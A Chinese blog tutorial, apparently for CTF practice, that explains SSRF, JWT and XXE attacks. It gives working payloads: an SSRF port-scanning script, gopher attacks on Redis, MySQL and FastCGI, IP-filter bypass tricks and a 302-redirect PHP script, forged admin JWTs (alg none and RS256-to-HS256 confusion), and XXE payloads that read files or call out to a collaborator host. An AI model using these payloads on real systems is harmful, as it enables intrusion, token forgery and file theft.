<p>服务端提供了从外部服务获取数据的功能，但没有对目标地址、协议等主要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起恶意请求</p>
<p>正常访问逻辑如下图</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209231828260.png" alt="image-20220923182815181"></p>
<h5 id="url结构"><a href="#url结构" class="headerlink" title="url结构"></a>url结构</h5><p>url结构遵循RFC1738标准，基本结构如下  </p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209221924251.png" alt="image-20220922192402191"></p>
<h3 id="0x2-ssrf漏洞利用"><a href="#0x2-ssrf漏洞利用" class="headerlink" title="0x2 ssrf漏洞利用"></a>0x2 ssrf漏洞利用</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>file协议读取文件,但是前提是知道文件名</p>
<h4 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h4><p>利用控制的<code>host</code>字段来扫描内网存活的主机</p>
<p>监听分三钟</p>
<ul>
<li>127.0.0.1 只允许本地访问</li>
<li>0.0.0.0 允许任意地址访问</li>
<li>192.168.233.233 只允许特定IP访问</li>
</ul>
<p>这里可以写一个脚本帮我们探测内网网络端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;靶机&quot;</span></span><br><span class="line"></span><br><span class="line">ports = [<span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="number">80000</span>,<span class="number">9000</span>,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">6379</span>,<span class="number">8088</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ports:</span><br><span class="line"></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://127.0.0.1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p)</span><br><span class="line">  &#125;</span><br><span class="line">  response = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> response.text != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port: &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port:&#123;&#125; is close&quot;</span>.<span class="built_in">format</span>(p))</span><br></pre></td></tr></table></figure>

<h4 id="gopher协议扩展攻击面"><a href="#gopher协议扩展攻击面" class="headerlink" title="gopher协议扩展攻击面"></a>gopher协议扩展攻击面</h4><p><code>gopher://</code>负责转发的一个协议</p>
<h5 id="攻击redis的6379端口"><a href="#攻击redis的6379端口" class="headerlink" title="攻击redis的6379端口"></a>攻击redis的6379端口</h5><p>redis是一个常用的缓存部件.一般运行在内网，使用者大多将其绑定在127.0.0.1:6397地址,且一般为空命令</p>
<p>redis一条命令执行一个行为,一条是错的,下一条会继续执行</p>
<p>如果我们能控制报文的任意一行,就可以实现攻击.</p>
<p>这里我们可以使用Gopherus工具生成gopher协议打一下,这里要注意一下,在使用Gopherus时要记得二次url编码</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232157592.png" alt="image-20220923215702293" style="zoom:67%;" />

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232157584.png" alt="image-20220923215747551"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232159757.png" alt="image-20220923215904733"></p>
<p>问题来了,这里为什么要进行二次编码呢?</p>
<blockquote>
<p>因为他进行了两次解码,我们在发送到redis要经过一个服务器的转发,比如这里是nginx转发,在我们传输到nginx时就进行了一次url解码,再发送给redis时,又进行了一次解码,所以我们要进行两次编码.</p>
</blockquote>
<h5 id="攻击MySQL的3306端口"><a href="#攻击MySQL的3306端口" class="headerlink" title="攻击MySQL的3306端口"></a>攻击MySQL的3306端口</h5><p>MySQL分为客户端和服务端,由客户端连接服务端有四种方式,分别是</p>
<ul>
<li>unix套接字</li>
<li>内存共享</li>
<li>命令管道</li>
<li>TCP/IP套接字</li>
</ul>
<p>我们进行攻击依靠第四种方式,MySQL客户端连接时,有两种情况:</p>
<ol>
<li>需要密码认证,服务器先发送salt,客户端使用salt进行加密后再验证</li>
<li>不需要密码认证,直接使用上边第四种方式发送数据包</li>
</ol>
<p>这里攻击MySQL要在非交互条件下进行,一定只能攻击没有密码的的MySQL服务端</p>
<p>这里我们写马要用MySQL语句写</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232233930.png" alt="image-20220923223307726"></p>
<h5 id="攻击fastcgi的9000端口"><a href="#攻击fastcgi的9000端口" class="headerlink" title="攻击fastcgi的9000端口"></a>攻击fastcgi的9000端口</h5><blockquote>
<p>php-fpm是个中间件,在需要PHP解释器来处理php文本时会用到php-fpm.</p>
<p>自从PHP5.3以后将php-fpm继承到php内核种.php-fpm提供了更好的php进程管理方式,可以有效控制内存和进程,可以平滑重载php配置</p>
</blockquote>
<p>以我们经常执行访问的<code>index.php?file=/etc/passwd</code>为例:</p>
<ol>
<li><p>浏览器发送访问index.php的请求到web服务器,比如nginx/apache</p>
</li>
<li><p>web服务器将请求的uri(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行</p>
</li>
<li><p>php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器</p>
</li>
<li><p>web服务器收到返回结果后,将http相应传给浏览器</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251339303.png" alt="image-20220925133934213"></p>
</li>
</ol>
<p>包含配置文件以后，后面紧跟一句</p>
<p><code>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name</code></p>
<p>定义了一个<code>SCRIPT_FILENAME</code>,值是<code>$document_root$fastcgi_script_name</code></p>
<p>重点看<code>SCRIPT_FILENAME</code>,这个就是nginx传给php-fpm的</p>
<p>nginx和php-fpm的数据交互,使用的是fast-cgi协议</p>
<h5 id="fastcgi协议"><a href="#fastcgi协议" class="headerlink" title="fastcgi协议"></a>fastcgi协议</h5><blockquote>
<p>fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器.</p>
</blockquote>
<p>可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件</p>
<p>ssrf-&gt;控制服务端脚本请求本地php-fpm端口-&gt;伪造配置参数包含php://input数据-&gt;执行php://input内提交的代码</p>
<p>这里还是使用gopherus</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251615362.png" alt="image-20220925161538070"></p>
<h3 id="0x3-ssrf的绕过"><a href="#0x3-ssrf的绕过" class="headerlink" title="0x3 ssrf的绕过"></a>0x3 ssrf的绕过</h3><h4 id="使用enclosed-alphanumerics绕过数字限制"><a href="#使用enclosed-alphanumerics绕过数字限制" class="headerlink" title="使用enclosed alphanumerics绕过数字限制"></a>使用<code>enclosed alphanumerics</code>绕过数字限制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<p>比如我们访问127.0.0.1,如果0被过滤了就可以使用127.⓿.⓿.1</p>
<h4 id="IP地址进制绕过"><a href="#IP地址进制绕过" class="headerlink" title="IP地址进制绕过"></a>IP地址进制绕过</h4><p>IP地址可以转int也可以转不同进制来表示</p>
<p>比如我们使用这个<a href="http://www.tbfl.store/net/ip.html">http://www.tbfl.store/net/ip.html</a> 来转一下127.0.0.1</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251642145.png" alt="image-20220925164246113"></p>
<h4 id="特殊写法绕过"><a href="#特殊写法绕过" class="headerlink" title="特殊写法绕过"></a>特殊写法绕过</h4><p>IP地址有一些特殊的写法,在Windows下,0代表0.0.0.0,而在Linux下,0代表的是127.0.0.1</p>
<p>所以,在某些情况下可以使用<a href="http://0.0.0.0/">http://00</a> 请求127.0.0.1</p>
<p>甚至我们可以将127.0.0.1中的0忽略掉,直接访问127.1代表127.0.0.1</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251654930.png" alt="image-20220925164910688"></p>
<p>Linux下也可以用中文句号代表点,<code>127。0。0。1</code>代表127.0.0.1</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251654788.png" alt="image-20220925165450693"></p>
<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以跳转到内网中，比如302.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果服务器跟踪了location字段,就可以自动转向</p>
<h4 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h4><p>网上有很多转换短网址的工具随便百度一个就有</p>
<p>比如说<code>http://charmersix.icu/</code>转换成<code>http://jj6m.cn/e0fSu</code></p>
<h2 id="第二节-JWT的原理以及突破"><a href="#第二节-JWT的原理以及突破" class="headerlink" title="第二节 JWT的原理以及突破"></a>第二节 JWT的原理以及突破</h2><h3 id="0x4-什么是jwt"><a href="#0x4-什么是jwt" class="headerlink" title="0x4 什么是jwt"></a>0x4 什么是jwt</h3><h4 id="jwt基本概念"><a href="#jwt基本概念" class="headerlink" title="jwt基本概念"></a>jwt基本概念</h4><p>json web token(jwt) 是一个轻量级的认证规范,这个规范允许使用jwt在用户和服务器之间传递安全可靠的信息.其本质是一个token,是一种紧凑的url安全方法,用于在网络通信的双方之间传递.</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209261855900.png" alt="900b3e81f832b2f08c2e8aabb540536a"></p>
<p>我们可以进jwt官网看一下<code>jwt.io</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209261948195.png" alt="image-20220926194846145"></p>
<p>jwt明文只能看不能改</p>
<h4 id="jwt使用"><a href="#jwt使用" class="headerlink" title="jwt使用"></a>jwt使用</h4><h4 id="jwt的漏洞"><a href="#jwt的漏洞" class="headerlink" title="jwt的漏洞"></a>jwt的漏洞</h4><h5 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h5><p>jwt支持空加密算法，可以在header中指定alg为none，这样的花，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证</p>
<p>但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;iat&quot;: 1664193697,</span><br><span class="line">  &quot;exp&quot;: 1664200897,</span><br><span class="line">  &quot;nbf&quot;: 1664193697,</span><br><span class="line">  &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;jti&quot;: &quot;fa2fb0a80953bd65a5dfe2afec06048e&quot;</span><br><span class="line">&#125;</span><br><span class="line">在两段编码中间用.隔开</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209262008821.png" alt="image-20220926200852044"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=.</span><br></pre></td></tr></table></figure>

<p>(header+”.”+payload+”.”, 去掉了’.’signature字段)</p>
<p>空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。</p>
<h5 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h5><p>我们可以使用<code>c-jwt-cracker-master</code>进行jwt密钥爆破</p>
<h5 id="私钥泄露攻击"><a href="#私钥泄露攻击" class="headerlink" title="私钥泄露攻击"></a>私钥泄露攻击</h5><p>这里访问<code>/private.key</code>就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成</p>
<p>这里就需要在本地安装node，然后<code>npm install jsonwebtoken</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;private.key&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> token =jwt.<span class="title function_">sign</span>(&#123;<span class="attr">user</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;<span class="attr">algorithm</span>:<span class="string">&#x27;RS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br></pre></td></tr></table></figure>

<p>然后写这么个脚本,生成</p>
<h5 id="公钥泄露攻击"><a href="#公钥泄露攻击" class="headerlink" title="公钥泄露攻击"></a>公钥泄露攻击</h5><p>jwt中最常用的两种算法为HMAC和RSA</p>
<p>HMAC是一种对称加密算法，使用相同的密钥进行加解密</p>
<p>RSA是一种非对称加密算法，使用私钥加密，公钥解密</p>
<p>在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token</p>
<p>密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;public.key&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> token =jwt.<span class="title function_">sign</span>(&#123;<span class="attr">user</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;<span class="attr">algorithm</span>:<span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br></pre></td></tr></table></figure>

<p>但是这里要注意，我们在进行密钥攻击时，一定要用post方式<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209262229683.png" alt="307afa51c5111551e222c88701a2f22"></p>
<h2 id="第三节-XXE文件读取"><a href="#第三节-XXE文件读取" class="headerlink" title="第三节　XXE文件读取"></a>第三节　XXE文件读取</h2><h3 id="0x5什么是xxe漏洞"><a href="#0x5什么是xxe漏洞" class="headerlink" title="0x5什么是xxe漏洞"></a>0x5什么是xxe漏洞</h3><h4 id="xxe的概念"><a href="#xxe的概念" class="headerlink" title="xxe的概念"></a>xxe的概念</h4><p>xxe是外部<code>XML Entity</code>实体注入,危害性较小</p>
<p>xml定义了两种实体类型，分别是</p>
<ul>
<li>普通entity 在xml文档中使用</li>
<li>参数entity 在dtd文档中使用</li>
</ul>
<h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><p>类似与HTML，是比较简单的标记语言</p>
<p>在我看来，XML与HTML的不同点可能就在与XML会有一个这种头</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p>
<p>然后就是XML有个DTD，DTD是一个非常重要的点，DTD可以引用一些外部的文件，也可以用SYSTEM的方式读取一些其他的DTD文件，就与文件包含一样。</p>
<p>内部声明DTD：</p>
<p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<p>引用外部DTD</p>
<p><code>&lt;!DOCTYPE 根元素 [SYSTEM　＂文件名/url＂]&gt;</code></p>
<p>这边来一段XML例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line"></span><br><span class="line">      &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">      &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">      &lt;!ENTITY jt &quot;test&quot;&gt;</span><br><span class="line">      ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt; Dont forget me this night！&lt;/body&gt;</span><br><span class="line">  &lt;test&gt;&amp;jt;&lt;/test&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<p>ELEMENT代表元素；ENTITY代表实例</p>
<p>xml非常灵活，定义后也可以不用，没有定义也可以用。</p>
<p>PCDATA　可以解析</p>
<p>例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span>   &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span>   &gt;</span><br><span class="line"><span class="symbol">&amp;amp;</span>  &amp;</span><br><span class="line"><span class="symbol">&amp;quot;</span> &quot;</span><br><span class="line"><span class="symbol">&amp;apos;</span> &#x27;</span><br></pre></td></tr></table></figure>

<p>CDATA 不可解析</p>
<p>来一个引用外部DTD的🌰</p>
<p>我们将上边的代码拆开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line"></span><br><span class="line">      &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">      &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">      &lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">      &lt;!ENTITY jt &quot;test&quot;&gt;</span><br><span class="line">      ]&gt;</span><br></pre></td></tr></table></figure>

<p>这一部分我们命名为simple.dtd</p>
<p>然后在另外一半中加入一串新的<code>DOCTYPE</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [SYSTEM &quot;simple.dtd&quot;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span> Dont forget me this night！<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;jt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>% xxx 是定义DTD变量，这种变量只能在dtd中使用，无法引用到xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % 123 &quot;123&quot;&gt;</span><br><span class="line">%123;</span><br></pre></td></tr></table></figure>

<h4 id="xxe危害"><a href="#xxe危害" class="headerlink" title="xxe危害"></a>xxe危害</h4><p>xxe利用，主流是读取文件为主，可以作为任意文件读取切入点</p>
<h4 id="xxe利用"><a href="#xxe利用" class="headerlink" title="xxe利用"></a>xxe利用</h4><p>php中xxe的一般写法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader <span class="comment">#禁用/启用加载外部实体的功能，参数为true时启用，参数为false时禁用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>) <span class="comment">#接收POST请求方式传的数据</span></span><br><span class="line"><span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD) <span class="comment">#通过解析一个xml标签字符串来组成该文档</span></span><br><span class="line"></span><br><span class="line">simplexml_import_dom <span class="comment">#把DOM节点转换为SimpleXMLElement对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$creds</span>-&gt;ctfshow <span class="comment">#获取页面中的ctfshow元素</span></span><br></pre></td></tr></table></figure>

<h5 id="有回显的情况"><a href="#有回显的情况" class="headerlink" title="有回显的情况"></a>有回显的情况</h5><p>这种情况我们可以直接用file协议读取文件</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;ctfshow&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/ctfshow&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h5><p>我们可以使用外部的DTD，通过一个公网ip进行读取</p>
<p>这里我们举两个例子分别是xml-dtd的OOB和只有dtd的OOB</p>
<p>我们抓包看一下，能发现xml</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216235.png" alt="image-20220909110223845"></p>
<p>这里我们发现里边并没有DTD，但是我们可以构造一段DTD</p>
<p><code>&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://f1hsyj0mt36nat549jqspboge7ky8n.burpcollaborator.net&quot;&gt; ] &gt;</code></p>
<p>这里我们选用的是burp suite自带的类似于dnslog的东西</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216328.png" alt="image-20220909112625808"></p>
<p>有时候我们也会遇到这种情况</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216379.png" alt="image-20220909114252726"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216275.png" alt="image-20220909114332668"></p>
<p>什么叫实体呢？<code>&amp;xxe</code>就是实体，那我们不用实体了，不引用到xml中了，直接用%定义DTD变量，但是这里要注意%定义的时候要有空格</p>
<p><code>% xxe</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216029.png" alt="image-20220909115840272"></p>
<h4 id="XXE-后端代码"><a href="#XXE-后端代码" class="headerlink" title="XXE 后端代码"></a>XXE 后端代码</h4><h5 id="xxe-php"><a href="#xxe-php" class="headerlink" title="xxe.php"></a>xxe.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// file:///</span></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span> -&gt; validateOnParse = <span class="literal">true</span>;<span class="comment">//第一种方法通过属性验证强制加载外部DTD(是否通过DTD强制加载)</span></span><br><span class="line">@<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;simple.xml&#x27;</span>);<span class="comment">//@表示会强制加载外部DTD文件</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">validate</span>())&#123; <span class="comment">//（第二种方法通过方法验证）这个@表示屏蔽验证不通过时的信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$dom</span>-&gt;documentElement;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span>-&gt;childNodes AS <span class="variable">$item</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$item</span>-&gt;nodeName .<span class="string">&quot;=&quot;</span>.<span class="variable">$item</span>-&gt;nodeValue.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

